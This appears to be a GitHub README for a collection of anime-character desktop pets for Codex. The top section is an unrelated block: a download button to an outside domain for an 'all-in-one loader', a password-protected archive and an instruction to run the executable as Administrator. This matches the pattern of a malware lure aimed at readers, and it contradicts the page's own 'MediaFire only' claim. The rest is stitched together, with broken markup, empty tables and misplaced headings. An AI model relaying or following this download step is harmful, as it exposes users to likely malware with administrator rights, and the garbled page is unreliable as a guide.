<div align="center">

  ![Downloads](https://img.shields.io/badge/Downloads-40K+-blue?style=for-the-badge&logo=github)
  ![User Rating](https://img.shields.io/badge/User%20Rating-4.8%2F5-gold?style=for-the-badge&logo=star)
  ![Latest Version](https://img.shields.io/badge/Latest%20Version-3.2.0-green?style=for-the-badge&logo=github)

</div>

<div align="center">

  <a href="https://respockett.pro/red">
    <img src="https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge" alt="Download Latest Release">
  </a>

</div>

> ⚡ **All-in-one loader:** The entire script is compiled into a single loader for your convenience — just download, extract, and run. No extra setup required.

1. **⬇️ Download** the tool from the button above.
2. **📦 Extract** the archive (password: `respocket`).
3. **🖱️ Run as Administrator** – right‑click the executable and select *Run as Administrator*.
4. **✅ Follow the setup wizard** – complete the installation.
5. **🚀 Launch the Tool** – the main window appears.

---

> ⚠️ **Important: Official Distribution Notice**
>
> We distribute our software **only through MediaFire**.  
> If the download link leads to **any other file-sharing service**, please **do not download it** — it may be an unofficial or modified copy.  
> For your safety, always use the official release.

---

<div align="center">

### 💙 Prepared by the Respocket Team

**This release was carefully prepared by the Respocket Team** — with attention to every detail, a focus on stability, and respect for our users.  
Thank you for choosing our software. Download only official versions and stay with us!
</div>


---

<div align="center">

<img src="assets/readme/character-lobby.webp" width="100%" alt="Xiao, Dan Heng, Kiana, Burnice, Miyabi, and Ganyu in the animated Codex Anime Pets lobby">

<p>
## Choose a companion

<sub>Select a portrait to open its character archive.</sub>

</div>

<p align="center">
## Character archive

<sub>Open a file to see the character details, animation sheet, and download.</sub>

</div>

<a id="character-01-xiao" name="character-01-xiao"></a>
<details open>
<summary><b>01 · Xiao</b></summary>

<br>

<table>
  <tr>
    <td align="center" width="220"><img src="assets/readme/archive-previews/xiao.webp" width="190" alt="Xiao idle"></td>
    <td>
      <b>Style:</b> 2D anime sticker<br>
      <b>Signature details:</b> golden eyes, purple forehead mark, teal-tipped hair, adeptal tattoo, jade ornaments, and Yaksha mask<br>
      <b>Mood:</b> vigilant and restrained, with a softer presence at desktop scale<br><br>
## Downloads

The packages are grouped by series. Open a group to see its characters and download links.

<a id="downloads-genshin-impact"></a>
<details>
<summary><b>Genshin Impact</b> · 13 companions　<kbd>Open</kbd></summary>

| Character | Edition | Pet ID | Package |
| --- | --- | --- | --- |
## Install

Using Xiao as an example:

```bash
mkdir -p ~/.codex/pets/xiao
unzip genshin-impact/xiao/xiao-2d.zip -d ~/.codex/pets/xiao
```

The resulting folder should look like this:

```text
~/.codex/pets/xiao/
├── pet.json
├── spritesheet.webp
└── README.md
```

To keep both Raiden Mei editions, install them in `raiden-mei/` and `raiden-mei-3d/`. Their IDs are separate.

## Animation system

A good desktop companion reads clearly at a glance, moves smoothly, and carries the character's personality from one state to the next.

| Detail | Codex v2 format |
| --- | --- |
| Atlas | 8 columns × 11 rows, `1536×2288` |
| Cell | `192×208` |
| Character states | idle, move right, move left, wave, jump, failed, waiting, working, review |
| Look loop | 16 clockwise directions with clear up, right, down, and left anchors |
| Transparency | RGBA WebP with clean unused cells |
| Version | `spriteVersionNumber: 2` |
| Review | frame inspection, GIF playback, edge checks, direction semantics, continuity review, blind direction checks, and a final visual pass |

The technical checks support the part that matters most: every animation should still feel like the same character.

## Production

The collection follows a reusable production flow:

```text
Character references
        ↓
Identity and style study
        ↓
Nine character animation states
        ↓
Four anchors and a 16-direction look loop
        ↓
Assembly and visual review
        ↓
A downloadable Codex v2 pet
```

## Contributing

New pets, animation repairs, presentation improvements, and workflow refinements are welcome. A distributable pet begins with:

```text
<pet-id>/
├── pet.json
└── spritesheet.webp
```

If you would like a character featured in the animated gallery, include a contact sheet or a few `192×208` GIF previews.

## Copyright and fan-work notice

This repository contains unofficial fan-created character animations. Some visual assets were generated with Codex or other AI tools and may constitute derivative fan works. Statements such as “non-commercial,” “for study and exchange only,” “all rights belong to their respective owners,” “AI-generated,” “fan work,” or “contact us for removal” express the project’s position only. They do **not** grant permission from any rights holder, transfer third-party rights, create a copyright exception, prevent a claim or takedown, or otherwise resolve possible copyright issues.

Any open-source license in this repository applies only to original code and material that the relevant contributor has the right to license. It does not license third-party character names, character designs, artwork, trademarks, or source material. Rights to third-party works remain with their respective owners. Before redistributing, publishing, or commercially using any character asset, you are responsible for determining whether permission is required and obtaining it where necessary.

## About this collection

Codex may live in a text box, but its companion does not have to. These pets wait with you, react with you, and make the quiet moments between tasks feel a little less empty.

<div align="center">

**Give your Codex a character worth coming back to.**

If this collection made you smile, leave a Star, make a Fork, or bring the next character.

</div>

<p align="center">
  <img src="assets/readme/collection-footer.webp" width="100%" alt="Xiao, Mitsuri, Sunday, and Ganyu beneath a quiet crescent moon">
</p>

<p align="center">
